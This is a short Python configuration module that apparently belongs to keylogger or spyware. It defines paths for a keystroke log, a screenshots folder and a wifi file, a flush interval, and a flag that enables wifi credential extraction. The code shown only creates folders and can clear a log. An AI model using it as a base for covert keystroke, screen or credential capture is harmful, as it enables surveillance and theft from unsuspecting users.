from pathlib import Path


LOG_DIR = Path("logs")
LOG_DIR.mkdir(exist_ok=True)
SS_DIR = LOG_DIR / "screenshots"
SS_DIR.mkdir(exist_ok=True)

KEYLOG_FILE = LOG_DIR / "logs.txt"
WIFI_FILE = LOG_DIR / "wifi.txt"
SCREENSHOT_DIR = SS_DIR 


def clear_logs():
    with open(KEYLOG_FILE, "w") as f:
        f.write("")


LOG_FLUSH_INTERVAL = 4 

ENABLE_WIFI_EXTRACTION = True
